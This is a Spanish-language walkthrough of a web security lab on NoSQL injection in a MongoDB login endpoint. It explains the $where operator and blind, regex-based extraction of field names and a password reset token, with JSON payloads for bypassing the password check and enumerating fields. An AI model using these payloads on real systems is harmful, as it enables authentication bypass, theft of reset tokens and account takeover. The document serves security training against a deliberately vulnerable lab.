# 💉 Extracción de campos desconocidos con operadores NoSQL

## 📄 Descripción del laboratorio

El endpoint de **login** es vulnerable a **inyección NoSQL** y permite la ejecución de **JavaScript arbitrario** mediante el operador `$where`.

Esto permite acceder al objeto `this` (el documento MongoDB), lo que hace posible **enumerar campos desconocidos y extraer valores sensibles**.

🎯 **Objetivo del laboratorio:**

* Enumerar los campos del usuario `carlos`
* Extraer el token de reseteo de contraseña `pwResetTkn`
* Resetear su contraseña e iniciar sesión como él

Credenciales de prueba:

```
wiener:peter
```

 

## 📚 Teoría

Cuando una aplicación evalúa directamente el input del usuario dentro de `$where`, es posible ejecutar **JavaScript sobre cada documento de MongoDB**.

Funciones útiles:

```javascript
Object.keys(this)
```

Enumera los nombres de los campos del documento.

```javascript
this.campo.match(/regex/)
```

Permite evaluar valores mediante expresiones regulares.

```javascript
this.campo.length
```

Permite determinar la longitud de strings.

Combinando estas funciones con **boolean-based blind extraction**:

* Si la condición es **true** → hay respuesta
* Si la condición es **false** → no hay resultados

Esto permite:

* Enumerar el **esquema interno**
* Extraer **valores sensibles carácter por carácter**
* Reconstruir documentos sin acceso directo a la base de datos

### 2️⃣ Uso de $where

Probamos utilizar `$where` para ejecutar JavaScript:

```json
{
  "username": "carlos",
  "password": {"$ne":"test"},
  "$where": "0"
}
```

<img width="768" height="313" alt="image" src="https://github.com/user-attachments/assets/116ac77d-caf7-4c29-b89b-d3bcb7ff2d75" />
<br>

La petición es aceptada.

Explicación:

```
$where = 0
```

Evalúa como **false**, pero el backend **prioriza la evaluación de `$where`**, ignorando el resto de condiciones.

 

### 3️⃣ Enumeración de campos

Utilizamos `Object.keys(this)` para obtener los nombres de los campos del documento.

Payload base:

```json
{
  "username":"carlos",
  "password":{"$ne":"test"},
  "$where":"Object.keys(this)[0].match('^.{}.*')"
}
```
